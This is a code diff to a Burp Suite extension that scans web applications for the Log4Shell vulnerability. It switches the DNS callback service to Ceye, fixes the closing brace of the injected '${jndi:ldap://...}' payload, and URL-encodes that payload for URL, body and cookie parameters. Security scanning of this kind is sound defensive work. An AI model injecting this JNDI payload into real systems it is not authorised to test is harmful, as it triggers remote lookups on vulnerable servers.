@@ -2,6 +2,7 @@ package burp.scanner;
 
 import burp.*;
 import burp.dnslog.IDnslog;
+import burp.dnslog.platform.Ceye;
 import burp.dnslog.platform.DnslogCN;
 import burp.utils.Utils;
 
@@ -11,7 +12,7 @@ import java.util.List;
 public class Log4j2Scanner implements IScannerCheck {
     private BurpExtender parent;
     private IExtensionHelpers helper;
-    private IDnslog dnslog = new DnslogCN();
+    private IDnslog dnslog = new Ceye();
 
 
     public Log4j2Scanner(final BurpExtender newParent) {
@@ -29,13 +30,13 @@ public class Log4j2Scanner implements IScannerCheck {
             try {
                 String tmpDomain = dnslog.getNewDomain();
                 byte[] tmpRawRequest = rawRequest;
-                String exp = "${jndi:ldap://" + tmpDomain + "/" + Utils.GetRandomNumber(100000, 999999);
+                String exp = "${jndi:ldap://" + tmpDomain + "/" + Utils.GetRandomNumber(100000, 999999) + "}";
                 boolean hasModify = false;
                 switch (param.getType()) {
                     case IParameter.PARAM_URL:
-                        exp = helper.urlEncode(exp);
                     case IParameter.PARAM_BODY:
                     case IParameter.PARAM_COOKIE:
+                        exp = helper.urlEncode(exp);
                         IParameter newParam = parent.helpers.buildParameter(param.getName(), exp, param.getType());
                         tmpRawRequest = parent.helpers.updateParameter(rawRequest, newParam);
                         hasModify = true;
@@ -46,7 +47,6 @@ public class Log4j2Scanner implements IScannerCheck {
                     case IParameter.PARAM_XML_ATTR:
                         //unsupported.
                 }
-                parent.stdout.println(param.getName() + ":" + param.getValue());
                 if (hasModify) {
                     IHttpRequestResponse tmpReq = parent.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRawRequest);
                     tmpReq.getResponse();
